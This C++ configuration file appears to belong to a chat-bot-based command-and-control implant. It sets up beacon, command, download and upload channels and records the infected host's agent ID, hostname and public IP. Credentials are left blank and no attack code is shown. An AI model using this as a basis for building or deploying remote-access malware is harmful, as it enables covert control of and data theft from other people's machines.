#include "core/Config.h"
#include "agents/Callback_utils.h"

namespace config {
    BotConfig cfg;

    BotConfig initialize_config() {
        cfg.token = "";
        cfg.appId = "";

        cfg.beacon_chanel_id = "";
        cfg.commands_chanel_id = "";
        cfg.download_chanel_id = "";
        cfg.upload_chanel_id = "";

        cfg.w_token = std::wstring(cfg.token.begin(), cfg.token.end());
        cfg.w_appId = std::wstring(cfg.appId.begin(), cfg.appId.end());

        cfg.agent_id = generate_agent_id();
        cfg.hostname = GetHostname();
        cfg.ip = getPublicIP();

        cfg.timezone_name = "Europe/Budapest";
        cfg.timezone_offset_minutes = -60;
        cfg.use_dst = true;

        return cfg;
    }
}
